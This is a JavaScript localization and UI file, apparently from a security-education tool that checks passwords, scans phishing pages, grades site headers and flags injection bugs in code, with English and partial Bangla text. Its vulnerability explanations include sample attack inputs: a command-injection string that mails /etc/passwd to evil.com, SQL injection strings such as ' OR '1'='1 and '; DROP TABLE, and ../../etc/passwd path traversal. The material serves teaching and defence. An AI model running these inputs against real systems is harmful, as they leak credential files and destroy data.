/* ================= Screens for web-attack protection: Password tab, Page & email X-ray, Website check, Code check, Browser Shield ================= */
Object.assign(I, {
  code:'<path d="m8 8-4 4 4 4M16 8l4 4-4 4M14 5l-4 14"/>',
  globe:'<circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/>',
  cookie:'<path d="M20 12a8 8 0 1 1-8-8 3 3 0 0 0 4 3 3 3 0 0 0 4 5Z"/><circle cx="9" cy="10" r="1"/><circle cx="14" cy="15" r="1"/><circle cx="9" cy="15" r="1"/>',
  frame:'<rect x="3" y="4" width="18" height="16" rx="2"/><rect x="7" y="8" width="10" height="8" rx="1" stroke-dasharray="2 2"/>',
  cursor:'<path d="m5 3 14 7-6 2-2 6Z"/>',
  pixel:'<rect x="4" y="4" width="16" height="16" rx="2"/><rect x="10" y="10" width="4" height="4" fill="currentColor"/>',
  wand:'<path d="m4 20 12-12M14 4v2M18 8h2M19 3l-1 1M15 7l2 2"/>',
  window:'<rect x="3" y="4" width="18" height="16" rx="2"/><path d="M3 9h18M6 6.5h.01M9 6.5h.01"/>',
  clock:'<circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/>',
  calendar:'<rect x="3" y="5" width="18" height="16" rx="2"/><path d="M3 10h18M8 3v4M16 3v4"/>'
});
ART.pwlock = `<svg class="ill" viewBox="0 0 320 170" aria-hidden="true"><circle cx="160" cy="88" r="74" fill="#BAE6FD"/><g transform="translate(60 44)"><rect width="200" height="44" rx="22" fill="#fff" ${DS}/><text x="22" y="29" font-size="20" font-family="monospace" fill="#0B2545" letter-spacing="3">•••••••••</text><rect x="12" y="58" width="176" height="12" rx="6" fill="#E0F2FE"/><rect x="12" y="58" width="130" height="12" rx="6" fill="#46B394"/></g><g transform="translate(232 112)"><rect x="-22" y="-8" width="44" height="34" rx="8" fill="#0EA5E9"/><path d="M-12-8v-8a12 12 0 0 1 24 0v8" stroke="#0EA5E9" stroke-width="6" fill="none"/><circle cy="8" r="5" fill="#fff"/></g></svg>`;
ART.mailxray = `<svg class="ill" viewBox="0 0 320 170" aria-hidden="true"><circle cx="160" cy="88" r="74" fill="#BAE6FD"/><g transform="translate(62 46)"><rect width="170" height="104" rx="12" fill="#fff" ${DS}/><path d="M0 12 85 62l85-50" stroke="#7DD3FC" stroke-width="6" fill="none"/><rect x="18" y="74" width="60" height="8" rx="4" fill="#E0F2FE"/><rect x="118" y="80" width="6" height="6" fill="#E07A6B"/></g><g transform="translate(224 104)"><circle r="28" fill="#fff" stroke="#0EA5E9" stroke-width="7"/><path d="M20 20 38 38" stroke="#0EA5E9" stroke-width="9" stroke-linecap="round"/><rect x="-5" y="-5" width="10" height="10" fill="#E07A6B"/></g></svg>`;
ART.webcheck = `<svg class="ill" viewBox="0 0 320 170" aria-hidden="true"><circle cx="160" cy="88" r="74" fill="#BAE6FD"/><g transform="translate(56 40)"><rect width="180" height="112" rx="12" fill="#fff" ${DS}/><rect width="180" height="22" rx="11" fill="#E0F2FE"/><circle cx="14" cy="11" r="4" fill="#E07A6B"/><circle cx="28" cy="11" r="4" fill="#E3A74F"/><circle cx="42" cy="11" r="4" fill="#46B394"/>${[0,1,2,3].map(i => `<circle cx="22" cy="${42 + i * 20}" r="7" fill="${i === 2 ? "#FFF3F0" : "#EEFAF5"}"/><path d="${i === 2 ? "M18 " + (38 + i * 20) + "l8 8M26 " + (38 + i * 20) + "l-8 8" : "M18 " + (42 + i * 20) + "l3 3 6-6"}" stroke="${i === 2 ? "#E07A6B" : "#46B394"}" stroke-width="3" fill="none"/><rect x="38" y="${38 + i * 20}" width="${[110, 90, 120, 80][i]}" height="8" rx="4" fill="#E0F2FE"/>`).join("")}</g><g transform="translate(244 116)"><circle r="26" fill="#0EA5E9"/><text y="10" text-anchor="middle" font-size="28" font-weight="800" font-family="sans-serif" fill="#fff">A</text></g></svg>`;
ART.codecheck = `<svg class="ill" viewBox="0 0 320 170" aria-hidden="true"><circle cx="160" cy="88" r="74" fill="#BAE6FD"/><g transform="translate(52 40)"><rect width="190" height="112" rx="12" fill="#0B1B2F" ${DS}/>${[0,1,2,3,4].map(i => `<rect x="${16 + (i % 2) * 14}" y="${16 + i * 18}" width="${[90, 120, 70, 110, 60][i]}" height="7" rx="3" fill="${i === 2 ? "#E07A6B" : ["#7DD3FC", "#FDE68A", "", "#B2F2BB", "#7DD3FC"][i]}"/>`).join("")}<rect x="8" y="50" width="174" height="18" rx="4" fill="#E07A6B" fill-opacity=".18"/></g><g transform="translate(240 118)"><path d="M0-30 24-22v16c0 16-10 26-24 30-14-4-24-14-24-30v-16Z" fill="#46B394" stroke="#fff" stroke-width="4"/><path d="m-10 0 7 7 13-14" stroke="#fff" stroke-width="5" fill="none" stroke-linecap="round"/></g></svg>`;
ART.shieldext = `<svg class="ill" viewBox="0 0 320 170" aria-hidden="true"><circle cx="160" cy="88" r="74" fill="#BAE6FD"/><g transform="translate(40 34)"><rect width="220" height="120" rx="14" fill="#fff" ${DS}/><rect width="220" height="26" rx="13" fill="#E0F2FE"/><rect x="40" y="7" width="130" height="12" rx="6" fill="#fff"/><circle cx="200" cy="13" r="8" fill="#0EA5E9"/><path d="M196 13l3 3 5-6" stroke="#fff" stroke-width="2.5" fill="none"/><rect x="30" y="48" width="160" height="56" rx="10" fill="#FFF3F0" stroke="#E07A6B" stroke-width="2"/><text x="110" y="72" text-anchor="middle" font-size="10.5" font-weight="800" font-family="sans-serif" fill="#A4453A">Don't type your password!</text><rect x="70" y="82" width="80" height="14" rx="7" fill="#E07A6B"/></g></svg>`;

const WS = {
 en:{
  pwTab:"Password",
  pwLbl:"Type a password to test", pwTip:"Stays on this device|It is checked right here and never saved or sent. Tip: test one that looks like yours, not your real bank PIN.",
  pwPh:"type a password…", pwGo:"How strong is it?", pwMake:"Make me a strong one", pwShow:"Show", pwHide:"Hide",
  pwNote:"Checked on this device only. Nothing is saved.",
  pwEmpty:["Is your password strong?","Type one to see how fast a thief could guess it."],
  pwTitle:{weak:"Easy to guess", medium:"Could be stronger", strong:"Strong password"},
  pwSub:{weak:"A thief could guess this quickly. Please change it.", medium:"Okay for small things. Not for your bank or email.", strong:"Hard to guess. Use it for one app only."},
  pat:{common:"It is one of the most used passwords in the world.", word:w=>`It uses a common word (“${w}”).`, keyboard:k=>`It is a keyboard pattern (“${k}”).`, repeat:"It repeats the same letter.", year:y=>`It contains a year (${y}). Thieves try years first.`, phone:"It looks like a phone number.", word_digits:"It is a word with a few numbers at the end. Thieves try this first.", personal:w=>`It contains your own name or detail (“${w}”).`, digits_only:"It is only numbers.", short:"It is short."},
  guessIn:t=>`A thief with stolen data could guess it: ${t}.`,
  pwDos:{weak:[["wand","Make a new one with 7 random words"],["lock","Turn on two-step login"],["refresh","Use a different password for every app"]], medium:[["wand","Add more random words"],["lock","Turn on two-step login"]], strong:[["refresh","Don't reuse it anywhere else"],["lock","Turn on two-step login too"]]},
  crackT:"How long would a thief need?",
  crack:{online_limited:["Website with a lock-out","Like your bank: only a few tries, then it blocks."], online:["Website without a limit","The thief tries 10 guesses a second online."], offline_slow:["Stolen, slow-hashed (good site)","The site used salt + a slow hash like bcrypt: about 10,000 guesses a second."], offline_fast:["Stolen, fast hash (bad site)","The site used plain MD5/SHA: about 10 billion guesses a second on gaming GPUs."]},
  twofaT:"Add a second lock (two-step login)", twofa:[["mail","SMS code","Better than nothing, but a SIM swap or a fake page can steal it."],["phone","App code (Authenticator)","Good. Still, a fake page can ask for it and pass it on in real time (relay attack)."],["key","Security key or passkey","Best. It checks the real website name, so fake pages get nothing."]],
  hibpT:"Has this password leaked before?", hibpB:"Only 5 characters of a scrambled code (SHA-1) are sent to Have I Been Pwned. Your password never leaves.", hibpGo:"Check leaks (ask me first)", hibpConsent:"Send only the first 5 characters of this password's SHA-1 code to api.pwnedpasswords.com?", hibpYes:"Yes, check", hibpNo:"Cancel",
  hibpRes:n=>n ? `Seen ${n.toLocaleString()} times in data leaks. Never use it.` : "Not found in known leaks. (That alone doesn't make it strong.)", hibpOff:"Couldn't reach the leak service. Try later.",
  genT:"Your new password idea", genB:b=>`7 random words, about ${Math.round(b)} bits. Easy to remember, very hard to guess. Write it down safely or use a password manager.`, genCopy:"Copy",
  xMath:"Math", xPat:"Patterns", xHash:"Hashing lab", xKanon:"k-anonymity",
  hashIntro:"See why sites must store salted, slow hashes (lecture: password hashing).", hashRun:"Run PBKDF2 (100,000 rounds)", hashUns:"SHA-256 (no salt, fast)", hashSalt:"SHA-256 with random salt", hashSlow:"PBKDF2-SHA256, 100,000 rounds", hashTime:ms=>`took ${ms} ms on this device — for a thief that is ${ms}× slower per guess than 1 ms`,
  kanon:(p,s)=>`SHA-1 prefix sent: ${p} · suffix kept here: ${s}…`,
  // page / email
  pageTitle:{high:"This page or email is a trap", verify:"Be careful with this page", low:"Nothing tricky found"},
  pageSub:{high:"It hides tricks to steal your password or act as you.", verify:"Some parts look unusual. Don't type passwords here.", low:"No hidden tricks found. Still, never share codes."},
  pageDos:{high:[["x","Don't click its links or buttons"],["lock","Don't type any password or PIN"],["trash","Delete it"]], verify:[["search","Open the real app instead of the link"],["lock","Don't type passwords here"]], low:[["check","Nothing to do"]]},
  pf:{
   tracking_pixel:["Spy pixel", d=>`A hidden 1-pixel image tells ${d.hosts.join(", ")} when and where you opened this.`, "A hidden picture tells the sender when you opened it.", "Tracking pixel"],
   csrf_img:["Hidden money request (CSRF)", d=>`An invisible image secretly calls ${d.url}. If you are logged in there, your browser sends your cookie with it.`, "A hidden part tries to use your bank login to send money.", "CSRF"],
   hidden_iframe:["Invisible frame (clickjacking)", d=>`A see-through frame of ${d.src || "another site"} sits on top. Your click lands on it, not on what you see.`, "An invisible layer tries to steal your click.", "Clickjacking"],
   tiny_iframe:["Tiny hidden frame", d=>`A 1-pixel frame loads ${d.src || "another page"} in the background.`, "A tiny hidden window loads another page.", "Clickjacking"],
   cursor_hidden:["Fake mouse pointer", d=>"The page hides the real pointer, so it can show a fake one in the wrong place (cursorjacking).", "The mouse pointer may be fake.", "Cursorjacking"],
   form_http:["Password sent without a lock", d=>`The form sends your password to ${d.action} over plain http.`, "Your password would travel without a lock.", "MITM"],
   form_foreign:["Password goes to another site", d=>`The form sends your password to ${d.host}${d.brand ? " (pretending to be " + d.brand + ")" : ""}.`, d=>`Your password would go to a stranger's site${d.brand ? ", not " + d.brand : ""}.`, "Phishing"],
   auto_submit_form:["Form sends itself (CSRF)", d=>"A script submits a hidden form as soon as the page opens, like the CalNet attack.", "The page sends a form by itself, without you.", "CSRF"],
   link_mismatch:["Link says one site, goes to another", d=>`The link shows ${d.shown} but really goes to ${d.real}.`, d=>`A link pretends to be ${d.shown}.`, "Phishing"],
   bad_link:["Dangerous link", d=>`A link goes to ${d.real}${d.lookalikeOf ? ", a copy of " + d.lookalikeOf : ""}.`, "A link goes to a fake site.", "Phishing"],
   payload_link:["Link with attack code", d=>`A link to ${d.real} carries ${d.kinds.join(", ")}.`, "A link carries hidden attack code.", "XSS"],
   js_link:["Link runs code", d=>"A link runs JavaScript instead of opening a page.", "A link runs hidden code.", "XSS"],
   event_handlers:["Code hidden in tags (XSS)", d=>`${d.count} tag(s) carry onerror/onload code. In a post or comment, this is stored XSS.`, "Hidden code is tucked inside the page.", "XSS"],
   script_in_content:["Script inside user content", d=>`${d.count} <script> block(s) inside text that should be plain.`, "Hidden code is inside the text.", "XSS"],
   meta_redirect:["Automatic redirect", d=>`The page jumps to ${d.to} by itself.`, "The page sends you somewhere else by itself.", "Redirect"],
   browser_in_browser:["Fake browser window", d=>`The page draws a fake window showing “${d.shows}”. Real login pop-ups can be dragged outside the page; this one can't.`, "It shows a fake login window with a real-looking address.", "Browser-in-browser"],
   urgency:["Pressure words", d=>`It says “${d.phrase}”. Scammers rush you so you don't think.`, "It rushes you. That is a scam trick.", "Phishing"],
   form_no_csrf_token:["Form without a CSRF token", d=>`POST form to ${d.action || "this page"} has no secret token.`, "A form is missing a safety code.", "CSRF"]
  },
  pageStats:{links:"links", forms:"forms", images:"images", iframes:"frames"},
  // headers
  hdrTitle:g=>`Website safety grade: ${g}`, hdrSub:{high:"Important protections are missing.", verify:"Good start. A few fixes left.", low:"All key protections are on."},
  hdrDos:{high:[["file","Send this report to your web developer"],["shieldok","Fix the red items first"]], verify:[["file","Send this report to your developer"]], low:[["check","Keep it this way"]]},
  hc:{hsts:["HTTPS forced (HSTS)","Stops attackers on Wi-Fi from switching visitors to plain http."], csp:["Content-Security-Policy","Blocks injected scripts (XSS) from running."], clickjacking:["Frame protection","Stops other sites hiding your page in an invisible frame (clickjacking)."], nosniff:["No type guessing","Stops the browser treating a file as code."], referrer:["Referrer policy","Stops leaking private page addresses to other sites."], cors:["Cross-site sharing (CORS)","Decides which other sites may read your data."], version_leak:["Version hidden","Attackers look up bugs by exact server version."], downgrade:["No http redirect","Redirecting to http:// opens the door to a man-in-the-middle."], cookie:["Cookie flags","Secure, HttpOnly and SameSite protect logins from theft and CSRF."]},
  ckIssue:{no_secure:"sent over http too", no_httponly:"readable by scripts (XSS can steal it)", no_samesite:"no SameSite (CSRF risk)", samesite_none_insecure:"SameSite=None without Secure", samesite_none:"sent on every cross-site request", tld_domain:"domain too wide", long_lived:"lives too long", bad_host_prefix:"wrong __Host- use"},
  fixLbl:"Fix", okLbl:"OK", missLbl:"Missing / weak",
  // code
  codeTitle:n=>n ? `${n} risky line${n > 1 ? "s" : ""} found` : "No risky lines found", codeSub:{high:"Attackers could inject their own commands.", verify:"Some lines need a safer way.", low:"No common injection or password-storage mistakes found."},
  codeDos:{high:[["code","Fix the red lines first"],["file","Use the “safe way” shown for each"]], verify:[["code","Apply the suggested fixes"]], low:[["check","Nice! Keep using safe APIs"]]},
  cr:{sql_concat:["SQL injection","User text is glued into an SQL query. ' OR '1'='1 would return every row; '; DROP TABLE could delete data."], sql_fstring:["SQL injection","An f-string builds the SQL query from user text."], cmd_injection:["Command injection","User text goes into a shell command. '; mail mallory@evil.com < /etc/passwd' would run too."], xss_sink:["XSS (script injection)","Text is put into the page as HTML, so <script> in it would run."], xss_fprintf:["XSS (script injection)","User text is printed into HTML without escaping."], eval:["Code from text","Text is run as code."], path_traversal:["Path traversal","User text picks the file; ../../etc/passwd could leak secrets."], weak_password_hash:["Weak password storage","Fast hashes (MD5/SHA) without salt fall to GPU guessing."], plain_password:["Plain password stored","The password itself is saved."], insecure_random:["Guessable random","Math.random/rand are predictable; tokens and session IDs must be secure random."], cookie_flags:["Cookie without flags","Missing Secure / HttpOnly / SameSite."], cors_any:["CORS open to all","Any site may read responses."], hardcoded_secret:["Secret in the code","A password or key is written in the source."], form_no_csrf:["Form without CSRF token","A POST form has no secret token."], http_url:["Plain http address","Traffic can be read or changed on the way."], tls_off:["Certificate check turned off","Anyone in the middle can pretend to be the server."]},
  lineLbl:"line", linesLbl:"lines", safeWay:"Safe way",
  labPh:{page:"Paste the email or page source (HTML) here…", headers:"Paste the response headers here (e.g. from: curl -I https://your-site.com)…", code:"Paste code here (Go, Python, C, JavaScript, PHP, Java)…"},
  labGo:{page:"X-ray this page", headers:"Check the website", code:"Check the code"},
  labHelp:{page:"Or upload a saved email / page (.html, .eml, .txt). It is never opened or run.", headers:"Browser → Developer tools → Network → click the page → Response headers → copy.", code:"Or upload a source file. Nothing is run."},
  labEx:{page:[["phishEmail","Phishing email"],["bitb","Fake Google window"],["safeEmail","Normal email"]], headers:[["headersBad","Weak website"],["headersGood","Well-protected website"]], code:[["codeBad","Lecture code (unsafe)"],["codeGood","Fixed code"]]},
  labTabs:{page:["Page & email","Find hidden tricks"], headers:["Website check","Headers & cookies grade"], code:["Code check","SQLi, XSS, command bugs"]},
  xt:{findings:"Findings", tags:"Tags", text:"Text", checks:"Checks", hdrs:"Headers", cookies:"Cookies", lines:"Lines", math:"Math", patterns:"Patterns", hashlab:"Hashing lab", kanon:"k-anonymity", json:"JSON"},
  // shield section
  shTitle:"Browser Shield", shSub:"A free add-on for Chrome and Edge that guards you on every website, not only here.",
  shFeat:[["key","Stops you before a password goes to a fake or unlocked page, with a 1-second safety pause."],["frame","Reveals invisible frames and fake pointers (clickjacking)."],["globe","Blocks pages that secretly send forms to your bank (CSRF)."],["link","Warns when a link hides attack code (XSS, SQL injection) or a look-alike address."],["pixel","Counts spy pixels that track you."],["eye","Easy and Expert views, English and Bangla. Nothing leaves your computer."]],
  shGet:"Download the Browser Shield", shSteps:["Download and unzip the file.","Open chrome://extensions (or edge://extensions).","Turn on Developer mode.","Click “Load unpacked” and choose the unzipped folder."], shNote:"Prototype for testing. A Chrome Web Store version is planned after review.",
  // lessons (added to the Learn view)
  lessons:{
   xss:["Script injection (XSS)", ["A website shows what users type. If it doesn't clean it, a <script> in a comment runs in every visitor's browser.", "That script acts as you: it can read the page and send your login cookie away.", "Sites fix it by escaping text and a Content-Security-Policy. You: don't open strange links to real sites with odd codes in them."], "codecheck"],
   sqli:["SQL injection", ["Websites ask their database questions in SQL.", "If a site glues your text into the question, typing ' OR '1'='1 can change the question itself.", "The fix is prepared statements: data is always data, never a command."], "codecheck"],
   cmdi:["Command injection", ["Some servers run programs with your text inside, like grep 'your text'.", "A ; can start a second, evil command.", "The fix: pass the program and the data separately (execv, subprocess.run with a list)."], "codecheck"],
   csrf:["Cross-site request forgery (CSRF)", ["When you log in, the browser keeps a cookie and sends it automatically.", "A bad page can make your browser send a request to your bank, and the cookie goes too.", "Sites fix it with secret CSRF tokens and SameSite cookies. The Browser Shield blocks hidden form sends."], "mailxray"],
   clickjack:["Clickjacking", ["A bad page can put a real site in an invisible frame on top of a fake button.", "You think you click “Play”, but you click “Pay” or “Allow”.", "Sites fix it with frame-ancestors; the Browser Shield reveals invisible frames."], "shieldext"],
   cookies:["Cookies and sessions", ["After login, a cookie (session token) is your wristband: show it and you're in.", "If someone steals it, they are you, no password needed.", "Good sites mark it Secure, HttpOnly and SameSite, and make it expire."], "webcheck"],
   certs:["The lock and certificates", ["https uses a certificate: a trusted company signs “this key belongs to bkash.com”.", "It proves the name, not that the owner is honest. Fake sites can get a lock too.", "So check the name first, then the lock."], "lockbar"],
   pwhash:["How sites should store passwords", ["Good sites never keep your password. They keep a hash: a scrambled fingerprint.", "A random salt per user and a slow hash (bcrypt, Argon2, PBKDF2) make stolen lists very slow to crack.", "Still, use a long, unique password: 7 random words is great."], "pwlock"],
   twofa:["Two-step login and its limits", ["Two-step login needs something you know plus something you have (your phone or a key).", "A fake page can still ask for your SMS code and use it at once (relay attack).", "Security keys and passkeys check the real site name, so they stop phishing."], "pwlock"],
   bitb:["Fake login windows", ["Some scam pages draw a whole fake browser window with a real-looking address inside.", "Real pop-ups can be dragged outside the page; fake ones can't leave it.", "When in doubt, close it and type the address yourself."], "shieldext"],
   pixel:["Spy pixels", ["An email can hide a 1×1 invisible picture.", "When it loads, the sender learns when, where and on what device you opened it.", "Turn off automatic images in your email app to stop it."], "mailxray"]
  },
  fileAsPage:"This file is a web page or email. Here is its X-ray:"
 },
 bn:{
  pwTab:"পাসওয়ার্ড",
  pwLbl:"পরীক্ষার জন্য একটা পাসওয়ার্ড লিখুন", pwTip:"এই ডিভাইসেই থাকে|এখানেই চেক হয়, কোথাও সেভ বা পাঠানো হয় না। টিপ: আসল পিন না, তার মতো একটা দিয়ে পরীক্ষা করুন।",
  pwPh:"একটা পাসওয়ার্ড লিখুন…", pwGo:"কতটা শক্ত?", pwMake:"আমাকে একটা শক্ত বানিয়ে দাও", pwShow:"দেখাও", pwHide:"লুকাও",
  pwNote:"শুধু এই ডিভাইসে চেক হয়। কিছুই সেভ হয় না।",
  pwEmpty:["আপনার পাসওয়ার্ড কি শক্ত?","একটা লিখুন, দেখুন চোর কত তাড়াতাড়ি অনুমান করতে পারে।"],
  pwTitle:{weak:"সহজে অনুমান করা যায়", medium:"আরও শক্ত হতে পারে", strong:"শক্ত পাসওয়ার্ড"},
  pwSub:{weak:"চোর খুব তাড়াতাড়ি এটা বের করে ফেলবে। বদলে নিন।", medium:"ছোটখাটো কাজে চলে। ব্যাংক বা ইমেইলে না।", strong:"অনুমান করা কঠিন। শুধু একটা অ্যাপে ব্যবহার করুন।"},
  pat:{common:"এটা পৃথিবীর সবচেয়ে বেশি ব্যবহৃত পাসওয়ার্ডগুলোর একটা।", word:w=>`এতে একটা চেনা শব্দ আছে (“${w}”)।`, keyboard:k=>`এটা কিবোর্ডের সারি (“${k}”)।`, repeat:"একই অক্ষর বারবার আছে।", year:y=>`এতে সাল আছে (${y})। চোর আগে সাল চেষ্টা করে।`, phone:"এটা দেখতে ফোন নম্বরের মতো।", word_digits:"একটা শব্দের শেষে কয়েকটা সংখ্যা। চোর আগে এটাই চেষ্টা করে।", personal:w=>`এতে আপনার নিজের নাম বা তথ্য আছে (“${w}”)।`, digits_only:"শুধু সংখ্যা।", short:"এটা ছোট।"},
  guessIn:t=>`চুরি করা ডেটা পেলে চোর অনুমান করতে পারবে: ${t}।`,
  pwDos:{weak:[["wand","৭টা এলোমেলো শব্দ দিয়ে নতুন বানান"],["lock","টু-স্টেপ লগইন চালু করুন"],["refresh","প্রতিটা অ্যাপে আলাদা পাসওয়ার্ড"]], medium:[["wand","আরও এলোমেলো শব্দ যোগ করুন"],["lock","টু-স্টেপ লগইন চালু করুন"]], strong:[["refresh","অন্য কোথাও একই পাসওয়ার্ড দেবেন না"],["lock","টু-স্টেপ লগইনও চালু রাখুন"]]},
  crackT:"চোরের কত সময় লাগবে?",
  crack:{online_limited:["লক-আউট থাকা ওয়েবসাইট","যেমন আপনার ব্যাংক: কয়েকবার ভুল হলেই বন্ধ।"], online:["লিমিট ছাড়া ওয়েবসাইট","চোর অনলাইনে সেকেন্ডে ১০ বার চেষ্টা করে।"], offline_slow:["চুরি হয়েছে, ধীর হ্যাশ (ভালো সাইট)","সাইট সল্ট + bcrypt-এর মতো ধীর হ্যাশ ব্যবহার করেছে: সেকেন্ডে প্রায় ১০,০০০ চেষ্টা।"], offline_fast:["চুরি হয়েছে, দ্রুত হ্যাশ (খারাপ সাইট)","সাইট সাধারণ MD5/SHA ব্যবহার করেছে: গেমিং GPU-তে সেকেন্ডে প্রায় ১০০০ কোটি চেষ্টা।"]},
  twofaT:"দ্বিতীয় তালা দিন (টু-স্টেপ লগইন)", twofa:[["mail","SMS কোড","কিছু না থাকার চেয়ে ভালো, কিন্তু সিম বদল বা নকল পেজ এটা চুরি করতে পারে।"],["phone","অ্যাপের কোড (Authenticator)","ভালো। তবু নকল পেজ কোড চেয়ে সাথে সাথে ব্যবহার করতে পারে (রিলে অ্যাটাক)।"],["key","সিকিউরিটি কী বা পাসকি","সবচেয়ে ভালো। এটা আসল সাইটের নাম মিলিয়ে দেখে, তাই নকল পেজ কিছু পায় না।"]],
  hibpT:"এই পাসওয়ার্ড কি আগে ফাঁস হয়েছে?", hibpB:"শুধু একটা এলোমেলো কোডের (SHA-1) প্রথম ৫টা অক্ষর Have I Been Pwned-এ যায়। আপনার পাসওয়ার্ড যায় না।", hibpGo:"ফাঁস চেক করো (আগে জিজ্ঞেস করবে)", hibpConsent:"এই পাসওয়ার্ডের SHA-1 কোডের শুধু প্রথম ৫টা অক্ষর api.pwnedpasswords.com-এ পাঠাব?", hibpYes:"হ্যাঁ, চেক করো", hibpNo:"বাদ দাও",
  hibpRes:n=>n ? `ডেটা ফাঁসে ${n.toLocaleString()} বার দেখা গেছে। কখনো ব্যবহার করবেন না।` : "জানা কোনো ফাঁসে পাওয়া যায়নি। (শুধু এতেই শক্ত হয় না।)", hibpOff:"ফাঁস চেকের সার্ভিসে যাওয়া যায়নি। পরে চেষ্টা করুন।",
  genT:"আপনার নতুন পাসওয়ার্ডের আইডিয়া", genB:b=>`৭টা এলোমেলো শব্দ, প্রায় ${Math.round(b)} বিট। মনে রাখা সহজ, অনুমান করা খুব কঠিন। নিরাপদে লিখে রাখুন বা পাসওয়ার্ড ম্যানেজার ব্যবহার করুন।`, genCopy:"কপি",
  xMath:"হিসাব", xPat:"প্যাটার্ন", xHash:"হ্যাশিং ল্যাব", xKanon:"k-anonymity",
  hashIntro:"দেখুন কেন সাইটকে সল্ট দেওয়া ধীর হ্যাশ রাখতে হয় (লেকচার: password hashing)।", hashRun:"PBKDF2 চালাও (১,০০,০০০ রাউন্ড)", hashUns:"SHA-256 (সল্ট ছাড়া, দ্রুত)", hashSalt:"র‍্যান্ডম সল্টসহ SHA-256", hashSlow:"PBKDF2-SHA256, ১,০০,০০০ রাউন্ড", hashTime:ms=>`এই ডিভাইসে ${ms} ms লেগেছে — চোরের প্রতিটা চেষ্টা ১ ms-এর চেয়ে ${ms} গুণ ধীর`,
  kanon:(p,s)=>`পাঠানো SHA-1 শুরু: ${p} · এখানে রাখা বাকি অংশ: ${s}…`,
  pageTitle:{high:"এই পেজ বা ইমেইল একটা ফাঁদ", verify:"এই পেজে সাবধান", low:"চালাকির কিছু পাইনি"},
  pageSub:{high:"আপনার পাসওয়ার্ড চুরি বা আপনার হয়ে কাজ করার চালাকি লুকানো আছে।", verify:"কিছু অংশ অস্বাভাবিক। এখানে পাসওয়ার্ড দেবেন না।", low:"লুকানো চালাকি পাইনি। তবু কোড কাউকে দেবেন না।"},
  pageDos:{high:[["x","এর লিংক বা বাটনে চাপ দেবেন না"],["lock","কোনো পাসওয়ার্ড বা পিন দেবেন না"],["trash","ডিলিট করুন"]], verify:[["search","লিংকের বদলে আসল অ্যাপ খুলুন"],["lock","এখানে পাসওয়ার্ড দেবেন না"]], low:[["check","কিছু করতে হবে না"]]},
  pf:{
   tracking_pixel:["গোয়েন্দা পিক্সেল", d=>`একটা লুকানো ১-পিক্সেলের ছবি ${d.hosts.join(", ")}-কে জানায় আপনি কখন, কোথা থেকে খুলেছেন।`, "লুকানো ছবি পাঠানোকারীকে জানায় আপনি কখন খুলেছেন।", "Tracking pixel"],
   csrf_img:["লুকানো টাকা পাঠানোর অনুরোধ (CSRF)", d=>`একটা অদৃশ্য ছবি গোপনে ${d.url}-এ যায়। আপনি ওখানে লগইন থাকলে ব্রাউজার আপনার কুকিও পাঠায়।`, "একটা লুকানো অংশ আপনার ব্যাংক লগইন দিয়ে টাকা পাঠাতে চায়।", "CSRF"],
   hidden_iframe:["অদৃশ্য ফ্রেম (ক্লিকজ্যাকিং)", d=>`${d.src || "অন্য সাইটের"} একটা স্বচ্ছ ফ্রেম ওপরে বসানো। আপনার ক্লিক যা দেখছেন তাতে না, ওটাতে পড়ে।`, "একটা অদৃশ্য স্তর আপনার ক্লিক চুরি করতে চায়।", "Clickjacking"],
   tiny_iframe:["ছোট্ট লুকানো ফ্রেম", d=>`১ পিক্সেলের একটা ফ্রেম পেছনে ${d.src || "অন্য পেজ"} খোলে।`, "ছোট্ট লুকানো জানালা অন্য পেজ খোলে।", "Clickjacking"],
   cursor_hidden:["নকল মাউস পয়েন্টার", d=>"পেজ আসল পয়েন্টার লুকিয়ে ভুল জায়গায় নকল পয়েন্টার দেখাতে পারে (কার্সরজ্যাকিং)।", "মাউস পয়েন্টার নকল হতে পারে।", "Cursorjacking"],
   form_http:["তালা ছাড়া পাসওয়ার্ড যায়", d=>`ফর্মটা আপনার পাসওয়ার্ড তালা ছাড়া (http) ${d.action}-এ পাঠায়।`, "আপনার পাসওয়ার্ড তালা ছাড়া যাবে।", "MITM"],
   form_foreign:["পাসওয়ার্ড অন্য সাইটে যায়", d=>`ফর্মটা পাসওয়ার্ড পাঠায় ${d.host}-এ${d.brand ? " (" + d.brand + " সেজে)" : ""}।`, d=>`আপনার পাসওয়ার্ড অচেনা সাইটে যাবে${d.brand ? ", " + d.brand + "-এ না" : ""}।`, "Phishing"],
   auto_submit_form:["ফর্ম নিজে নিজে যায় (CSRF)", d=>"পেজ খুলতেই একটা স্ক্রিপ্ট লুকানো ফর্ম পাঠিয়ে দেয়, ঠিক CalNet হামলার মতো।", "পেজ আপনাকে ছাড়াই নিজে ফর্ম পাঠায়।", "CSRF"],
   link_mismatch:["লিংক দেখায় এক সাইট, যায় অন্যটায়", d=>`লিংক দেখায় ${d.shown}, কিন্তু আসলে যায় ${d.real}-এ।`, d=>`একটা লিংক ${d.shown} সেজে আছে।`, "Phishing"],
   bad_link:["বিপজ্জনক লিংক", d=>`একটা লিংক যায় ${d.real}-এ${d.lookalikeOf ? ", " + d.lookalikeOf + "-এর নকল" : ""}।`, "একটা লিংক নকল সাইটে যায়।", "Phishing"],
   payload_link:["হামলার কোডসহ লিংক", d=>`${d.real}-এর একটা লিংকে আছে ${d.kinds.join(", ")}।`, "একটা লিংকে হামলার কোড লুকানো।", "XSS"],
   js_link:["লিংক কোড চালায়", d=>"লিংকটা পেজ না খুলে JavaScript চালায়।", "একটা লিংক লুকানো কোড চালায়।", "XSS"],
   event_handlers:["ট্যাগে লুকানো কোড (XSS)", d=>`${d.count}টা ট্যাগে onerror/onload কোড। পোস্ট বা কমেন্টে থাকলে এটা stored XSS।`, "পেজের ভেতরে কোড লুকানো।", "XSS"],
   script_in_content:["লেখার ভেতরে স্ক্রিপ্ট", d=>`সাধারণ লেখার ভেতরে ${d.count}টা <script>।`, "লেখার ভেতরে লুকানো কোড।", "XSS"],
   meta_redirect:["নিজে নিজে অন্য পেজে যায়", d=>`পেজ নিজে থেকেই ${d.to}-এ চলে যায়।`, "পেজ আপনাকে নিজে থেকে অন্য কোথাও পাঠায়।", "Redirect"],
   browser_in_browser:["নকল ব্রাউজার জানালা", d=>`পেজ একটা নকল জানালা আঁকে, তাতে লেখা “${d.shows}”। আসল পপ-আপ পেজের বাইরে টেনে নেওয়া যায়, এটা যায় না।`, "আসলের মতো ঠিকানাসহ নকল লগইন জানালা দেখায়।", "Browser-in-browser"],
